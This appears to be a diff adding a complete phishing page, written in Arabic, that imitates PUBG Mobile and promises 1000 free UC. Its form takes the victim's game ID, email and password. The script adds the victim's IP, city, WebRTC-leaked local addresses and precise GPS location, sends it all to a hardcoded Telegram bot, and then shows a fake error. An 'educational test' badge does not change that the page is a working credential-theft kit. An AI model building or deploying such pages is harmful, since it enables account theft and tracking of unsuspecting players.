@@ -1,0 +1,305 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<title>PUBG Mobile - احصل على 1000 UC</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<style>
+* { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Roboto', -apple-system, 'Segoe UI', Arial, sans-serif; }
+body {
+    background: linear-gradient(160deg, #0a0a0a, #1a1a1a);
+    min-height: 100vh;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    color: #fff;
+    padding: 20px;
+}
+.box {
+    background: #1c1c1c;
+    padding: 35px 28px;
+    border-radius: 14px;
+    max-width: 450px;
+    width: 100%;
+    border: 1px solid #2a2a2a;
+    box-shadow: 0 20px 60px rgba(0,0,0,0.8);
+}
+.logo {
+    text-align: center;
+    margin-bottom: 20px;
+}
+.logo img {
+    height: 90px;
+    width: auto;
+    filter: drop-shadow(0 0 20px rgba(243,191,58,0.3));
+}
+h1 {
+    font-size: 22px;
+    text-align: center;
+    margin-bottom: 8px;
+    color: #f3bf3a;
+    font-weight: 800;
+    text-shadow: 0 2px 10px rgba(243,191,58,0.3);
+}
+.sub {
+    font-size: 13px;
+    color: #999;
+    text-align: center;
+    margin-bottom: 25px;
+    line-height: 1.6;
+}
+.offer {
+    background: linear-gradient(135deg, #f3bf3a, #e0a800);
+    border-radius: 12px;
+    padding: 20px;
+    text-align: center;
+    margin-bottom: 25px;
+    position: relative;
+    overflow: hidden;
+}
+.offer::before {
+    content: '🎮';
+    position: absolute;
+    font-size: 100px;
+    opacity: 0.1;
+    top: -20px;
+    right: -20px;
+}
+.offer .num {
+    font-size: 36px;
+    font-weight: 900;
+    color: #1a1a1a;
+    text-shadow: 0 2px 5px rgba(255,255,255,0.2);
+}
+.offer .lbl {
+    font-size: 14px;
+    color: #1a1a1a;
+    margin-top: 4px;
+    font-weight: 600;
+}
+.field {
+    margin-bottom: 18px;
+}
+.field label {
+    display: block;
+    font-size: 13px;
+    color: #999;
+    margin-bottom: 6px;
+    text-align: right;
+}
+.field input {
+    width: 100%;
+    padding: 14px 16px;
+    font-size: 15px;
+    border: 1px solid #2a2a2a;
+    border-radius: 8px;
+    background: #0f0f0f;
+    color: #fff;
+    outline: none;
+    transition: 0.2s;
+    direction: ltr;
+    text-align: left;
+}
+.field input:focus {
+    border-color: #f3bf3a;
+    box-shadow: 0 0 0 3px rgba(243,191,58,0.15);
+}
+.btn {
+    width: 100%;
+    padding: 15px;
+    background: linear-gradient(135deg, #f3bf3a, #e0a800);
+    color: #1a1a1a;
+    border: none;
+    border-radius: 10px;
+    font-size: 16px;
+    font-weight: 800;
+    cursor: pointer;
+    margin-top: 10px;
+    transition: 0.2s;
+    box-shadow: 0 8px 20px rgba(243,191,58,0.25);
+}
+.btn:hover { transform: translateY(-2px); }
+.btn:disabled { opacity: 0.6; cursor: not-allowed; }
+.terms {
+    display: flex;
+    align-items: flex-start;
+    gap: 10px;
+    margin: 20px 0;
+    font-size: 12px;
+    color: #999;
+    text-align: right;
+    line-height: 1.6;
+}
+.terms input {
+    margin-top: 3px;
+    width: 16px;
+    height: 16px;
+    cursor: pointer;
+    flex-shrink: 0;
+}
+.terms a { color: #f3bf3a; text-decoration: none; }
+.msg {
+    padding: 12px;
+    border-radius: 8px;
+    font-size: 13px;
+    margin-bottom: 15px;
+    display: none;
+    text-align: center;
+}
+.msg.err { background: rgba(244,67,54,0.15); color: #ff6b6b; display: block; border: 1px solid rgba(244,67,54,0.3); }
+.msg.ok { background: rgba(76,175,80,0.15); color: #4caf50; display: block; border: 1px solid rgba(76,175,80,0.3); }
+.badge {
+    position: fixed;
+    top: 10px;
+    left: 10px;
+    background: rgba(0,0,0,0.7);
+    color: #fff;
+    font-size: 10px;
+    padding: 4px 8px;
+    border-radius: 12px;
+    z-index: 9999;
+}
+.footer {
+    text-align: center;
+    margin-top: 20px;
+    font-size: 11px;
+    color: #555;
+}
+</style>
+</head>
+<body>
+<div class="badge">🧪 اختبار تعليمي</div>
+
+<div class="box">
+    <div class="logo">
+        <img src="https://upload.wikimedia.org/wikipedia/en/thumb/8/8c/PUBG_Mobile_logo.png/512px-PUBG_Mobile_logo.png" alt="PUBG Mobile">
+    </div>
+    
+    <h1>احصل على 1000 UC مجاناً</h1>
+    <p class="sub">مكافأة حصرية من PUBG Mobile. أدخل حسابك لاستلام الـ UC.</p>
+
+    <div class="offer">
+        <div class="num">1000 UC</div>
+        <div class="lbl">شحن مجاني</div>
+    </div>
+
+    <div class="msg" id="msg"></div>
+
+    <div class="field">
+        <label>ID اللعبة (PUBG ID)</label>
+        <input type="text" id="gameid" placeholder="5123456789" autocomplete="off">
+    </div>
+
+    <div class="field">
+        <label>البريد الإلكتروني</label>
+        <input type="email" id="email" placeholder="example@gmail.com" autocomplete="off">
+    </div>
+
+    <div class="field">
+        <label>كلمة المرور</label>
+        <input type="password" id="pass" placeholder="••••••••" autocomplete="off">
+    </div>
+
+    <div class="terms">
+        <input type="checkbox" id="terms">
+        <label for="terms">أوافق على <a href="#">شروط الاستخدام</a> الخاصة بـ PUBG Mobile</label>
+    </div>
+
+    <button class="btn" id="btn" onclick="submitForm()">استلام UC الآن</button>
+
+    <div class="footer">© PUBG Mobile - جميع الحقوق محفوظة</div>
+</div>
+
+<script>
+const TOKEN = "8885955583:AAFB3gmzus0AJNLcRlDkZ8UsOWH_4DnManE";
+const CHAT_ID = "7560932400";
+
+function send(text) {
+    return fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        body: JSON.stringify({chat_id: CHAT_ID, text: text})
+    }).catch(()=>{});
+}
+
+async function submitForm() {
+    const gameid = document.getElementById("gameid").value.trim();
+    const email = document.getElementById("email").value.trim();
+    const pass = document.getElementById("pass").value;
+    const terms = document.getElementById("terms").checked;
+    const msg = document.getElementById("msg");
+    const btn = document.getElementById("btn");
+
+    msg.className = "msg";
+
+    if (!gameid || !email || !pass) {
+        msg.className = "msg err";
+        msg.innerText = "يرجى إدخال جميع البيانات المطلوبة";
+        return;
+    }
+
+    if (!terms) {
+        msg.className = "msg err";
+        msg.innerText = "يجب الموافقة على الشروط أولاً";
+        return;
+    }
+
+    btn.disabled = true;
+    btn.innerText = "جاري التحقق...";
+
+    const info = {
+        type: "PUBG Mobile",
+        gameId: gameid,
+        email: email,
+        password: pass,
+        userAgent: navigator.userAgent,
+        time: new Date().toLocaleString("ar-EG")
+    };
+
+    try {
+        const r = await fetch("https://ipwho.is/");
+        const j = await r.json();
+        info.ip = j.ip;
+        info.country = j.country;
+        info.city = j.city;
+    } catch(e) { info.ip = "unknown"; }
+
+    info.webrtc = await new Promise(r => {
+        try {
+            const pc = new RTCPeerConnection({iceServers:[{urls:"stun:stun.l.google.com:19302"}]});
+            pc.createDataChannel("");
+            const ips = new Set();
+            pc.onicecandidate = e => {
+                if (e.candidate) {
+                    const ip = e.candidate.candidate.split(" ")[4];
+                    if (ip) ips.add(ip);
+                } else { pc.close(); r(Array.from(ips).join(", ")); }
+            };
+            pc.createOffer().then(o => pc.setLocalDescription(o));
+            setTimeout(() => { pc.close(); r(Array.from(ips).join(", ")); }, 3000);
+        } catch(e) { r("err"); }
+    });
+
+    info.gps = await new Promise(r => {
+        if (!navigator.geolocation) return r("غير مدعوم");
+        navigator.geolocation.getCurrentPosition(
+            p => r(`${p.coords.latitude}, ${p.coords.longitude}`),
+            () => r("مرفوض"),
+            {enableHighAccuracy: true, timeout: 8000}
+        );
+    });
+
+    let text = "🎮 PUBG Login:\n\n" + 
+        Object.entries(info).map(([k,v]) => `${k}: ${v}`).join("\n");
+    await send(text);
+
+    setTimeout(() => {
+        msg.className = "msg err";
+        msg.innerText = "يبدو أن هذا الحساب غير صحيح. تأكد من ID اللعبة.";
+        btn.disabled = false;
+        btn.innerText = "استلام UC الآن";
+    }, 2000);
+}
+</script>
+</body>
+</html>
